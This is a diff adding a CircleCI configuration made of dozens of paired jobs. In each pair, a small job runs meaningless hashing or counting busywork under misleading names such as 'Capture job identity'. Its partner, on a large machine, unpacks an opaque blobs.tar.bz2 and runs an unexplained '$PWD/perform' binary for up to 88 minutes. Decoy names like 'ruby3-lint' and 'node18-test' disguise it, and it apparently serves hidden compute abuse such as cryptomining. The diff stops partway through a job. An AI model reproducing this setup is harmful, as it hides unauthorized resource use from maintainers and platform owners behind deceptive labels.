@@ -1,0 +1,1363 @@
+version: 2.1
+
+jobs:
+  prep_ruby3-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/outbox
+            set +o pipefail 2>/dev/null; seq 1 1480980 | awk '{print $1*7919 % 2147483647}' > /tmp/outbox/output.log; true
+            echo "staging complete; file length=$(wc -c </tmp/outbox/output.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - output.log
+  ruby3-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/output.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  p1_papa-8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Rebase partial order
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=18 2>/dev/null | sha256sum; true ; } > /tmp/outbox/stats.tsv
+            echo "staging complete; file length=$(wc -c </tmp/outbox/stats.tsv)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stats.tsv
+  papa-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  rerun_may9-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 20480 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/outbox/relay.ok
+            echo "staging complete; file length=$(wc -c </tmp/outbox/relay.ok)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - relay.ok
+  may9-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  go_uniform:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 2097152 | fold -w16 | sort -u | wc -l; true ; } > /tmp/outbox/816.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/816.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 816.txt
+  uniform:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  green_BUILD_QA:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 235520 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/outbox/25.blob
+            echo "staging complete; file length=$(wc -c </tmp/outbox/25.blob)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 25.blob
+  BUILD_QA:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/25.blob > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  reset_rocket:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 2 40011 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/outbox/step-23.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-23.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-23.log
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  redo_atlas-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 25000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/outbox/timings.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/timings.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - timings.jsonl
+  atlas-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/timings.jsonl > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  builder_polaris-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 3422); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/outbox/event.ndjson
+            echo "staging complete; file length=$(wc -c </tmp/outbox/event.ndjson)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - event.ndjson
+  polaris-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  orchestrate_victor-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 253678 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/outbox/371v2.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/371v2.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 371v2.out
+  victor-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  alpha_v9-ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Snapshot session env
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 28283); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/outbox/summary.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/summary.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - summary.log
+  v9-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  runner_feb6-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 56623104 | fold -w16 | sort -u | wc -l; true ; } > /tmp/outbox/cache.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/cache.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - cache.bin
+  feb6-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/cache.bin > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  warmer_bake-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; head -c 18874368 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/outbox/PASS
+            echo "staging complete; file length=$(wc -c </tmp/outbox/PASS)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - PASS
+  bake-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  step2_q4-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 146280 | awk '{print $1*$1}' | sha1sum | cut -c1-24; true ; } > /tmp/outbox/ckpt-D.pickle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/ckpt-D.pickle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - ckpt-D.pickle
+  q4-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/ckpt-D.pickle > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  step1_node18-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 200973 | sha1sum; true ; } > /tmp/outbox/step-4.log
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-4.log)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-4.log
+  node18-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  bootstrap_LAB_CHECK_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 29360128 | fold -w16 | sort -u | wc -l; true ; } > /tmp/outbox/step-7.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-7.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-7.txt
+  LAB_CHECK_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-4.log > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  go_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Rotate build log
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 22528 | wc -c; true ; } > /tmp/outbox/phase-pass.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/phase-pass.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - phase-pass.txt
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/phase-pass.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  hook_november:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Reorder index entries
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc '[:xdigit:]' | head -c 16384 | wc -c; true ; } > /tmp/outbox/pt-E.pkl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/pt-E.pkl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - pt-E.pkl
+  november:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  canary_ValidateService:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Reset analytics bucket
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 116550 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/outbox/.pid
+            echo "staging complete; file length=$(wc -c </tmp/outbox/.pid)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - .pid
+  ValidateService:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  phase1_DATA-412:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 158221 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/outbox/step-pass.txt
+            echo "staging complete; file length=$(wc -c </tmp/outbox/step-pass.txt)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - step-pass.txt
+  DATA-412:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/step-pass.txt > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  produce_sm-x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Compute slot digest
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<183598;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/outbox/manifest.bin
+            echo "staging complete; file length=$(wc -c </tmp/outbox/manifest.bin)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - manifest.bin
+  sm-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/manifest.bin > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  g2_feat-9685:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Compute aggregate hash
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; tr -dc 'A-F0-9' </dev/urandom | head -c 921600 | fold -w8 | sort -u | wc -l; true ; } > /tmp/outbox/checkpoint-v2.pickle
+            echo "staging complete; file length=$(wc -c </tmp/outbox/checkpoint-v2.pickle)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - checkpoint-v2.pickle
+  feat-9685:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/checkpoint-v2.pickle > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  B_titan-ng:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Churn allocator pool
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 481281 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/outbox/main_phase_output.out
+            echo "staging complete; file length=$(wc -c </tmp/outbox/main_phase_output.out)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - main_phase_output.out
+  titan-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/main_phase_output.out > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  builder_add-login-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Measure entropy sample
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; yes abc | head -n 55121 | sha256sum; true ; } > /tmp/outbox/2024-05-13.data
+            echo "staging complete; file length=$(wc -c </tmp/outbox/2024-05-13.data)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - 2024-05-13.data
+  add-login-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/2024-05-13.data > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  bake_sep15-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 1 572600 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/outbox/stats.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/outbox/stats.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - stats.jsonl
+  sep15-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/stats.jsonl > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  canary1_brodcast:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/outbox
+            { set +o pipefail 2>/dev/null; seq 2 24344 | factor | wc -l; true ; } > /tmp/outbox/cache.raw
+            echo "staging complete; file length=$(wc -c </tmp/outbox/cache.raw)"
+      - persist_to_workspace:
+          root: /tmp/outbox
+          paths:
+            - cache.raw
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Ingest handoff
+          command: |
+            { tail -c 100 /tmp/outbox/pt-v2.state > /dev/null; echo "tail ok" ; } || true
+      - run:
+          name: Pull code
+          command: git clone --depth 1 --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prepare source archive
+          command: tar -I bzip2 -xf blobs.tar.bz2
+      - run:
+          name: Collect artifacts
+          command: sleep 30
+      - run:
+          no_output_timeout: 88m
+          command: "$PWD/perform"
+  Delta_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/outbox
+      - run:
+          name: Store intermediate blob
